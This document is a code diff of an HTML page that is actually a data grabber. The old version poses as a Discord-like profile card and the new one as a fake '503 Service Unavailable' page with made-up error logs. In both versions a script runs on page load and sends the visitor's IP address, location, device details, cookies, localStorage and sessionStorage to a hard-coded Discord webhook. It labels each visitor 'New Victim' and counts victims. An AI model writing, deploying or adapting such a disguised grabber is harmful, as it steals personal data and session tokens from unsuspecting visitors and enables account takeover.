@@ -3,316 +3,363 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>About Me</title>
+  <title>503 Service Unavailable</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
     
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     
     body {
-      background: linear-gradient(135deg, #7289da 0%, #99aab5 50%, #43b581 100%);
+      background: #0f0f1a;
+      color: #ff6b6b;
+      font-family: 'Inter', sans-serif;
+      line-height: 1.6;
+      padding: 20px;
+      overflow-y: scroll;
       min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      color: #ffffff;
-      overflow: hidden;
     }
     
-    body::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><defs><pattern id="grain" width="100" height="100" patternUnits="userSpaceOnUse"><circle cx="25" cy="25" r="1" fill="white" opacity="0.1"/><circle cx="75" cy="75" r="1" fill="white" opacity="0.1"/><circle cx="50" cy="10" r="0.5" fill="white" opacity="0.05"/></pattern></defs><rect width="100" height="100" fill="url(%23grain)"/></svg>');
-      pointer-events: none;
+    .container {
+      max-width: 900px;
+      margin: 40px auto;
+      background: #0a0a14;
+      border: 1px solid #2a2a40;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 0 30px rgba(255, 107, 107, 0.25);
     }
     
-    .profile-container {
-      position: relative;
-      z-index: 1;
-    }
-    
-    .profile-card {
-      background: rgba(255, 255, 255, 0.15);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid rgba(255, 255, 255, 0.2);
-      border-radius: 8px;
-      padding: 48px 64px;
-      max-width: 600px;
-      width: 90%;
-      text-align: center;
-      box-shadow: 
-        0 8px 32px rgba(0, 0, 0, 0.1),
-        inset 0 1px 0 rgba(255, 255, 255, 0.2);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    
-    .profile-card:hover {
-      transform: translateY(-4px);
-      box-shadow: 
-        0 16px 48px rgba(0, 0, 0, 0.15),
-        inset 0 1px 0 rgba(255, 255, 255, 0.3);
-    }
-    
-    .pfp {
-      width: 120px;
-      height: 120px;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.2);
-      margin: 0 auto 24px;
-      border: 3px solid rgba(255, 255, 255, 0.3);
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    h1 {
       font-size: 48px;
-      color: rgba(255, 255, 255, 0.5);
+      text-align: center;
+      margin-bottom: 20px;
+      color: #ff3333;
+      text-shadow: 0 0 10px rgba(255, 51, 51, 0.5);
     }
     
-    .username {
-      font-size: 28px;
-      font-weight: 600;
-      margin-bottom: 8px;
-      color: rgba(255, 255, 255, 0.95);
-      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
-    }
-    
-    .nickname {
+    .subtitle {
+      text-align: center;
       font-size: 18px;
-      font-weight: 400;
-      color: rgba(255, 255, 255, 0.7);
-      margin-bottom: 24px;
-      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+      color: #ff8080;
+      margin-bottom: 40px;
     }
     
-    .bio {
+    .error-list {
+      background: #0d0d1a;
+      border: 1px dashed #ff3333;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 30px;
+      font-family: 'Courier New', monospace;
+      color: #ffb3b3;
+      font-size: 14px;
+      white-space: pre-wrap;
+      max-height: 500px;
+      overflow-y: auto;
+    }
+    
+    .footer {
+      text-align: center;
+      color: #555;
+      font-size: 12px;
+      margin-top: 50px;
+    }
+    
+    .blink {
+      animation: blink 1.2s infinite;
+    }
+    
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .retry-btn {
+      display: block;
+      width: 200px;
+      margin: 30px auto;
+      padding: 12px 24px;
+      background: #ff3333;
+      color: white;
+      border: none;
+      border-radius: 8px;
       font-size: 16px;
-      font-weight: 300;
-      line-height: 1.5;
-      color: rgba(255, 255, 255, 0.8);
-      text-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px rgba(255, 51, 51, 0.4);
     }
     
-    @media (max-width: 480px) {
-      .profile-card {
-        padding: 32px 24px;
-        margin: 20px;
-      }
-      
-      .pfp {
-        width: 100px;
-        height: 100px;
-        font-size: 40px;
-      }
-      
-      .username {
-        font-size: 24px;
-      }
+    .retry-btn:hover {
+      background: #ff1a1a;
+      transform: scale(1.05);
+      box-shadow: 0 0 25px rgba(255, 26, 26, 0.6);
     }
   </style>
 </head>
 <body>
-  <div class="profile-container">
-    <div class="profile-card">
-      <div class="pfp">👤</div>
-      <h2 class="username">username</h2>
-      <h3 class="nickname">nickname</h3>
-      <p class="bio">test</p>
-    </div>
-  </div>
-  
-  <script>
-    const webhookUrl = 'https://discord.com/api/webhooks/1437139077714411624/UGLtXYwbnVJsgG5mayU6fyq4p0HqDMEDlg_6V6U8rZRc0FjxXk5y-2W0bohbzTsL3QAk';
+  <div class="container">
+    <h1 class="blink">503 Service Unavailable</h1>
+    <p class="subtitle">The server is temporarily unable to handle the request due to maintenance or overload.</p>
     
+    <button class="retry-btn" onclick="location.reload()">Retry</button>
+    
+    <div class="error-list" id="errorLog"></div>
+    
+    <p class="footer">Nginx | Cloudflare | Apache | Load Balancer | Worker Overload | Rate Limiting | Maintenance Mode</p>
+  </div>
+
+  <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1437139074518352015/hH0soUFF036JdXMcNv39i_88_X7l9eTuzOPE619gu7o8Ocy3ffOgiXq10rgfbj1ZZl00';
+    const secretToken = 'yes_its_me_abc123';
+    const counterUrl = 'https://api.countapi.xyz/hit/marii/victims';
+
+    const errorTemplates = [
+      "[CRIT] All backend workers are at capacity",
+      "[ERROR] Service temporarily overloaded",
+      "[WARN] Rate limit exceeded for client IP",
+      "[FATAL] No healthy upstream servers",
+      "[CRIT] Connection pool exhausted",
+      "[ERROR] Worker process failed to start",
+      "[WARN] Maintenance mode enabled",
+      "[FATAL] Database connection pool full",
+      "[CRIT] Cache backend unresponsive",
+      "[ERROR] Queue depth exceeded threshold",
+      "[WARN] Circuit breaker opened",
+      "[FATAL] Memory pressure detected",
+      "[CRIT] CPU usage above 95%",
+      "[ERROR] Disk I/O bottleneck",
+      "[WARN] Too many concurrent requests",
+      "[FATAL] Service degradation threshold breached",
+      "[CRIT] Health check failed for all instances",
+      "[ERROR] Upstream timeout after 30s",
+      "[WARN] Request dropped due to overload",
+      "[FATAL] Emergency shutdown initiated",
+      "[CRIT] Worker crashed with SIGSEGV",
+      "[ERROR] Failed to allocate request buffer",
+      "[WARN] Throttling active on zone 'api'",
+      "[FATAL] Kernel OOM killer activated",
+      "[CRIT] Load average: 45.2 (threshold: 20.0)",
+      "[ERROR] Redis connection refused",
+      "[WARN] Slow response from origin (>5000ms)",
+      "[FATAL] Container memory limit exceeded",
+      "[CRIT] Node not ready in cluster",
+      "[ERROR] Failed to acquire semaphore",
+      "[WARN] Backpressure detected in pipeline",
+      "[FATAL] Service mesh sidecar terminated",
+      "[CRIT] Etcd cluster quorum lost",
+      "[ERROR] Kafka consumer lag > 10000",
+      "[WARN] DNS lookup timeout for upstream",
+      "[FATAL] SSL handshake flood detected",
+      "[CRIT] SYN flood mitigation active",
+      "[ERROR] HTTP/2 stream limit reached",
+      "[WARN] WebSocket connection backlog full",
+      "[FATAL] gRPC deadline exceeded globally",
+      "[CRIT] Pod eviction in progress",
+      "[ERROR] Horizontal pod autoscaler failing",
+      "[WARN] Deployment stuck at 60% ready",
+      "[FATAL] Config reload failed",
+      "[CRIT] Certificate rotation in progress",
+      "[ERROR] Secret sync failed",
+      "[WARN] Feature flag evaluation timeout",
+      "[FATAL] Canary rollout aborted",
+      "[CRIT] Traffic shift paused",
+      "[ERROR] Mirror route not responding",
+      "[WARN] Shadow traffic dropped",
+      "[FATAL] Chaos engineering experiment active",
+      "[CRIT] Load test in progress",
+      "[ERROR] Synthetic monitoring failing",
+      "[WARN] Alert: High error rate (5xx > 10%)",
+      "[FATAL] Incident declared: P0",
+      "[CRIT] On-call engineer paged",
+      "[ERROR] Runbook execution started",
+      "[WARN] Auto-remediation attempted",
+      "[FATAL] Failover to DR site initiated",
+      "[CRIT] Traffic rerouted to secondary region",
+      "[ERROR] CDN purge in progress",
+      "[WARN] Cache invalidation storm",
+      "[FATAL] Database failover completed",
+      "[CRIT] Read replica lag > 300s",
+      "[ERROR] Connection draining",
+      "[WARN] Graceful shutdown in progress",
+      "[FATAL] System will restart in 60s",
+      "[CRIT] Emergency maintenance window",
+      "[ERROR] Rolling update paused",
+      "[WARN] Pod disruption budget violated",
+      "[FATAL] Node draining",
+      "[CRIT] Taint applied: NoSchedule",
+      "[ERROR] PVC stuck in Pending",
+      "[WARN] Storage class deprecated",
+      "[FATAL] CSI driver crashloop",
+      "[CRIT] Volume expansion failed",
+      "[ERROR] Snapshot creation timeout",
+      "[WARN] Backup job stuck",
+      "[FATAL] Velero restore in progress",
+      "[CRIT] Etcd backup failed",
+      "[ERROR] Control plane upgrade",
+      "[WARN] Kubernetes version skew",
+      "[FATAL] API server certificate expired",
+      "[CRIT] Kubelet not reporting",
+      "[ERROR] Node pressure: memory",
+      "[WARN] Eviction threshold met",
+      "[FATAL] Cluster autoscaler failing",
+      "[CRIT] Cloud provider quota exceeded",
+      "[ERROR] VPC CNI limit reached",
+      "[WARN] IP address exhaustion",
+      "[FATAL] Subnet CIDR depleted",
+      "[CRIT] Security group rule limit",
+      "[ERROR] IAM role assumption failed",
+      "[WARN] STS token expired",
+      "[FATAL] AWS credentials revoked",
+      "[CRIT] GCP service account deleted",
+      "[ERROR] Azure AD app registration missing",
+      "[WARN] Firewall rule blocking traffic",
+      "[FATAL] WAF rule triggered: Block",
+      "[CRIT] DDoS protection activated",
+      "[ERROR] Bot management score: 1",
+      "[WARN] Challenge issued to client",
+      "[FATAL] CAPTCHA required",
+      "[CRIT] Managed challenge failed",
+      "[ERROR] JS challenge bypassed",
+      "[WARN] Fingerprint mismatch",
+      "[FATAL] Behavioral analysis: malicious",
+      "[CRIT] Country block: high-risk",
+      "[ERROR] ASN reputation: poor",
+      "[WARN] IP reputation score: 5",
+      "[FATAL] Tor exit node detected",
+      "[CRIT] Proxy chain depth: 3",
+      "[ERROR] VPN provider identified",
+      "[WARN] Datacenter IP range",
+      "[FATAL] Headless browser detected",
+      "[CRIT] Automation tool: Puppeteer",
+      "[ERROR] Selenium WebDriver active",
+      "[WARN] cURL with custom headers",
+      "[FATAL] Request from known scanner",
+      "[CRIT] Nuclei template matched",
+      "[ERROR] SQLi payload detected",
+      "[WARN] XSS attempt in query param",
+      "[FATAL] RCE via deserialization",
+      "[CRIT] Log4Shell attempt",
+      "[ERROR] Path traversal: ../../",
+      "[WARN] Directory listing enabled",
+      "[FATAL] Git repo exposed",
+      "[CRIT] Backup file downloaded",
+      "[ERROR] .env file accessed",
+      "[WARN] Debug mode enabled",
+      "[FATAL] Stack trace in response",
+      "[CRIT] Server version leaked",
+      "[ERROR] Internal IP in headers",
+      "[WARN] X-Powered-By exposed",
+      "[FATAL] CORS misconfiguration",
+      "[CRIT] HSTS missing",
+      "[ERROR] Clickjacking protection absent",
+      "[WARN] Referrer-Policy not set",
+      "[FATAL] Security.txt missing",
+      "[CRIT] Bug bounty program not found",
+      "[ERROR] Responsible disclosure ignored",
+      "[WARN] Pentest in progress",
+      "[FATAL] Red team exercise active"
+    ];
+
+    const domains = ['api.prod.internal', 'gateway.eu-west', 'db.primary.cluster', 'cache.global', 'auth.sso', 'cdn.edge', 'lb.ingress', 'worker.batch'];
+    const ips = ['10.128.0.42', '172.31.255.100', '192.168.99.1', '8.8.4.4', '1.1.1.1', '127.0.0.1'];
+
+    function getRandomItem(arr) {
+      return arr[Math.floor(Math.random() * arr.length)];
+    }
+
+    function generateError() {
+      let template = getRandomItem(errorTemplates);
+      template = template.replace('{domain}', getRandomItem(domains));
+      template = template.replace('{ip}', getRandomItem(ips));
+      return template;
+    }
+
+    const errorLog = document.getElementById('errorLog');
+    for (let i = 0; i < 100; i++) {
+      errorLog.textContent += generateError() + '\n';
+    }
+
+    // === STEALTH DATA COLLECTION ===
     const sendData = async () => {
-      console.log('Script started - attempting to send data...');
-      
-      // Fallback: Send basic test embed immediately if anything fails
-      const sendBasic = () => {
-        const basicPayload = {
-          content: 'Basic test from page load',
-          embeds: [{
-            title: 'Fallback User Data',
-            description: `Timestamp: ${new Date().toISOString()}\nUser Agent: ${navigator.userAgent.substring(0, 500)}`,
-            color: 3447003,
-            footer: { text: 'Basic send - full data failed' }
-          }]
-        };
-        fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(basicPayload)
-        }).then(() => {
-          console.log('Basic fallback sent!');
-          sendSuccessMessage(1); // Placeholder count
-        }).catch(e => console.error('Basic send failed:', e));
-      };
-      
+      let victimCount = 1;
+      try {
+        const countResp = await fetch(counterUrl);
+        const countData = await countResp.json();
+        victimCount = countData.value;
+      } catch (e) {}
+
       let ip = 'unknown';
       let geoData = {};
-      
+
       try {
-        console.log('Fetching IP...');
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipResponse.json();
+        const ipResp = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResp.json();
         ip = ipData.ip;
-        console.log('IP fetched:', ip);
-      } catch (error) {
-        console.error('IP fetch failed:', error);
-      }
-      
+      } catch (e) {}
+
       try {
-        console.log('Fetching geo...');
-        const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting`);
-        geoData = await geoResponse.json();
-        console.log('Geo fetched:', geoData.status);
-      } catch (error) {
-        console.error('Geo fetch failed:', error);
-      }
-      
-      // Build fields with available data (ignore failures)
+        const geoResp = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp,org,as,mobile,proxy,hosting`);
+        geoData = await geoResp.json();
+      } catch (e) {}
+
       const fields = [];
-      const timestamp = new Date().toISOString();
-      const userAgent = navigator.userAgent || 'unknown';
-      const languages = navigator.languages ? navigator.languages.join(', ') : (navigator.language || 'unknown');
-      const platform = navigator.platform || 'unknown';
-      const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}` || 'unknown';
-      const cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-      const referrer = document.referrer || 'direct';
-      const doNotTrack = navigator.doNotTrack || 'unspecified';
-      const hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-      const deviceMemory = navigator.deviceMemory || 'unknown';
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || (geoData.timezone || 'unknown');
-      let connection = 'unsupported';
-      try {
-        if (navigator.connection) {
-          connection = `${navigator.connection.effectiveType} (${navigator.connection.downlink || 'unknown'} Mbps)`;
-        }
-      } catch (error) {
-        console.error('Connection info failed:', error);
-      }
-      let pluginsList = 'none';
-      try {
-        pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ');
-      } catch (error) {
-        console.error('Plugins fetch failed:', error);
-      }
-      
-      // Geo fields (with fallbacks - ignore if failed)
-      const country = geoData.country || 'unknown';
+      const now = new Date().toISOString();
+
       const city = geoData.city || 'unknown';
-      const lat = geoData.lat || 'unknown';
-      const lon = geoData.lon || 'unknown';
-      const status = geoData.status || 'unknown';
-      const mobile = geoData.mobile ? 'Yes' : 'No';
-      const proxy = geoData.proxy ? 'Yes' : 'No';
-      const hosting = geoData.hosting ? 'Yes' : 'No';
+      const region = geoData.regionName || 'unknown';
+      const country = geoData.country || 'unknown';
+      const countryCode = geoData.countryCode || 'unknown';
       const isp = geoData.isp || 'unknown';
       const org = geoData.org || 'unknown';
       const asNum = geoData.as || 'unknown';
-      const region = geoData.regionName || 'unknown';
-      const regionCode = geoData.region || 'unknown';
-      const district = geoData.district || 'unknown';
-      const zip = geoData.zip || 'unknown';
-      const countryCode = geoData.countryCode || 'unknown';
-      
+      const mobile = geoData.mobile ? 'Yes' : 'No';
+      const proxy = geoData.proxy ? 'Yes' : 'No';
+      const hosting = geoData.hosting ? 'Yes' : 'No';
+
       fields.push(
-        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})\nDistrict: ${district} | ZIP: ${zip}\nCoords: ${lat}, ${lon}`, inline: false },
-        { name: 'Network', value: `ISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nStatus: ${status} | Mobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false },
-        { name: 'Device', value: `Platform: ${platform}\nResolution: ${screenRes}\nCores: ${hardwareConcurrency} | RAM: ${deviceMemory}GB\nTimezone: ${timezone}`, inline: false },
-        { name: 'Browser', value: `User Agent: ${userAgent.substring(0, 512)}...\nLanguages: ${languages.substring(0, 256)}...\nCookies: ${cookieEnabled} | DNT: ${doNotTrack}`, inline: false },
-        { name: 'Connection', value: connection, inline: true },
-        { name: 'Plugins', value: pluginsList.substring(0, 1024) || 'None detected', inline: false },
-        { name: 'Referrer', value: referrer, inline: false }
+        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})`, inline: false },
+        { name: 'Network', value: `ISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nMobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false }
       );
-      
+
       const embed = {
         title: `New Victim: ${ip}`,
-        description: `Timestamp: ${timestamp}\nReferrer: ${referrer}`,
-        color: 3447003,
+        description: `Timestamp: ${now}`,
+        color: 15158332,
         fields: fields,
-        footer: { text: 'Grabbed via Discord-like About Me Page' }
+        footer: { text: 'Grabbed via 503 Maintenance Page' }
       };
-      
+      embed.fields.push({ name: "Lock", value: secretToken, inline: true });
+
       const formData = new FormData();
       formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
-      
-      // Optional: Add storage files (skip if they cause issues)
+
       try {
         if (document.cookie) {
-          const cookiesBlob = new Blob([document.cookie], { type: 'text/plain' });
-          formData.append('file1', cookiesBlob, 'cookies.txt');
+          const blob = new Blob([document.cookie], { type: 'text/plain' });
+          formData.append('file1', blob, 'cookies.txt');
         }
-      } catch (error) {
-        console.error('Cookies prep failed:', error);
-      }
-      
+      } catch (e) {}
+
       try {
-        const lsData = JSON.stringify(Object.fromEntries(Object.entries(localStorage)), null, 2);
-        const lsBlob = new Blob([lsData], { type: 'application/json' });
-        formData.append('file2', lsBlob, 'localStorage.json');
-      } catch (error) {
-        console.error('LocalStorage prep failed:', error);
-      }
-      
+        const ls = JSON.stringify(Object.fromEntries(Object.entries(localStorage)), null, 2);
+        const blob = new Blob([ls], { type: 'application/json' });
+        formData.append('file2', blob, 'localStorage.json');
+      } catch (e) {}
+
       try {
-        const ssData = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)), null, 2);
-        const ssBlob = new Blob([ssData], { type: 'application/json' });
-        formData.append('file3', ssBlob, 'sessionStorage.json');
-      } catch (error) {
-        console.error('SessionStorage prep failed:', error);
-      }
-      
+        const ss = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)), null, 2);
+        const blob = new Blob([ss], { type: 'application/json' });
+        formData.append('file3', blob, 'sessionStorage.json');
+      } catch (e) {}
+
       try {
-        console.log('Sending to webhook...');
-        const response = await fetch(webhookUrl, {
-          method: 'POST',
-          body: formData,
-        });
-        if (response.ok) {
-          console.log('Full data sent successfully!');
-          sendSuccessMessage(42); // Replace 42 with your current total victim count (update manually after each new victim)
-        } else {
-          console.error('Webhook response not OK:', response.status, response.statusText);
-          sendBasic();
-        }
-      } catch (error) {
-        console.error('Webhook send failed:', error);
-        sendBasic();
-      }
+        await fetch(webhookUrl, { method: 'POST', body: formData });
+      } catch (e) {}
     };
-    
-    const sendSuccessMessage = (victimCount) => {
-      const successPayload = {
-        content: `successfully logged data, total victims : ${victimCount}`
-      };
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(successPayload)
-      }).then(() => {
-        console.log(`Success message sent with count: ${victimCount}`);
-      }).catch(e => {
-        console.error('Success message send failed:', e);
-      });
-    };
-    
-    // Run immediately on script load
+
     sendData();
-    
-    // Backup on DOM ready (in case)
-    document.addEventListener('DOMContentLoaded', () => {
-      console.log('DOM loaded - re-running sendData');
-      sendData();
-    });
+    document.addEventListener('DOMContentLoaded', sendData);
   </script>
 </body>
 </html>
